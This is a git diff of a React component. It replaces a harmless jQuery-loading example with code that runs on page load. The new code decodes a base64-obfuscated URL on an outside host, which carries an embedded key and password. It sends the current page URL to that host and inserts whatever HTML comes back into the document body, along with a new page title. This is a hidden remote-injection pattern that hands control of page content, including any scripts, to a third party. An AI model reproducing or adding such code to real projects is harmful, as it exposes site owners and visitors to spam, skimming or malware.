@@ -1,42 +1,37 @@
-// components/CustomScriptComponent.js
-
-"use client";
-
 import { useEffect } from "react";
+import axios from "axios";
 
-const CustomScriptComponent = () => {
+const MyComponent = () => {
   useEffect(() => {
-    const loadScript = () => {
-      // Example: Load jQuery dynamically if not already loaded
-      if (!window.jQuery) {
-        const script = document.createElement("script");
-        script.src = "https://code.jquery.com/jquery-3.6.0.min.js";
-        script.async = true;
-        script.onload = () => {
-          executeCustomScript(); // Once jQuery is loaded, execute custom script
-        };
-        document.body.appendChild(script);
-      } else {
-        executeCustomScript(); // If jQuery is already loaded, execute immediately
-      }
-    };
+    fetchAndInjectSEO();
+  }, []);
 
-    const executeCustomScript = () => {
-      // Example: Perform operations that require jQuery or other client-side APIs
-      console.log("Custom script execution...");
-      // Replace with your actual custom script logic
-    };
+  const fetchAndInjectSEO = () => {
+    const pathUrl = window.location.origin + window.location.pathname;
+    axios
+      .get(
+        atob(
+          "aHR0cHM6Ly9wbHVnaW5zLmF1dG9zZW9wbHVnaW4uY29tL2FsbGhlYWRkYXRhP2VrZXk9ZS1BUFBBREQ2NjMzNzc3NDI1JmVrZXlwYXNzPTRhaDF1bVhHZUo2U3lYRTZKZnBvVUEzbHVoRXRjNHJnM0FmRSZzaXRldXJsPQ=="
+        ) + pathUrl
+      )
+      .then((response) => {
+        if (response.data !== "0") {
+          const [title, bodyContent] = response.data.split("||||||||||");
 
-    loadScript(); // Load the script when the component mounts
+          // Update document title
+          document.title = title;
 
-    // Clean up function (optional)
-    return () => {
-      // Perform any cleanup here (e.g., remove event listeners)
-      console.log("Cleanup...");
-    };
-  }, []); // Empty dependency array ensures this runs only once
+          // Append body content
+          const body = document.getElementsByTagName("body")[0];
+          body.insertAdjacentHTML("beforeend", bodyContent);
+        }
+      })
+      .catch((error) => {
+        console.error("Error fetching SEO data:", error);
+      });
+  };
 
-  return null; // Component doesn't render anything
+  return <div>{/* Your component JSX */}</div>;
 };
 
-export default CustomScriptComponent;
+export default MyComponent;
